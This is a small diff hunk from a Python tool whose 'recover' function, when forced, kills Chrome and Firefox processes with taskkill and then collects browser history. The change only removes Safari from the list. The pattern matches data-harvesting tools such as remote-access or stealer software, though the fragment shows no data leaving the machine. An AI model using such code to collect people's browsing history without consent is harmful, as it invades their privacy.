@@ -22,7 +22,7 @@ def recover(action_type, force):
 			return {'message': stdout.getvalue().strip()}
 	elif action_type == 'history':
 		if force:
-			for browser in ('chrome', 'firefox', 'safari'):
+			for browser in ('chrome', 'firefox'):
 				os.system(f'tasklist | find /i "{browser}.exe" > nul && taskkill /im {browser}.exe /F > nul')
 		
 		return {'message': get_browserhistory()}
